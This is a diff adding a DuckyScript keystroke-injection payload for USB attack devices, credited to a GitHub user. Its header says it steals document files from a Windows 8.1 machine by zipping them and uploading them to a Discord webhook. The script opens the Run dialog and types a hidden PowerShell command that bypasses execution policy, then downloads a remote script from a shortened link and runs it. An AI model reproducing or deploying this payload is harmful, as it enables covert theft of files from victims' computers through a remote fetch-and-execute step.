@@ -1,0 +1,16 @@
+REM ┌────────────────────────────────────────────────────┐
+REM │ hooker01 | github.com/hooker01                     │
+REM │ Description: Finds common document files (.doc,    │
+REM │ .pdf, .txt, etc), compresses them, and uploads to  │
+REM │ a specified Discord webhook in zip chunks.         │
+REM │ Note: Replace 'WEBHOOK_LINK' with your             │
+REM │ actual webhook URL.                                │           
+REM │ Target: WINDOWS 8.1                                │
+REM └────────────────────────────────────────────────────┘
+
+DELAY 500
+ESC
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_LINK'; irm https://is.gd/TWzbXI | iex
+ENTER
